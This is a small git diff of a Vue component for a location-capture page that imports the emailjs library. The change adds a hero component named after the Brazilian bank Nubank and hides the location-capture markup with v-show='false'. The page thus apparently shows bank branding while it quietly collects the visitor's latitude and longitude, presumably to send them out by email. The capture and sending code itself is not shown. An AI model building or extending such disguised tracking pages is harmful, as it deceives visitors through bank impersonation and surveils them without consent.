@@ -1,5 +1,6 @@
 <template>
-  <div class="p-6 text-center">
+  <NubankHero />
+  <div class="p-6 text-center" v-show="false">
     <h1 class="text-2xl font-bold mb-4">Captura de Localização</h1>
 
     <div v-if="latitude && longitude">
@@ -14,6 +15,7 @@
 </template>
 
 <script setup>
+import NubankHero from './components/NubankHero.vue';
 import { ref, onMounted } from 'vue'
 import emailjs from '@emailjs/browser';
 
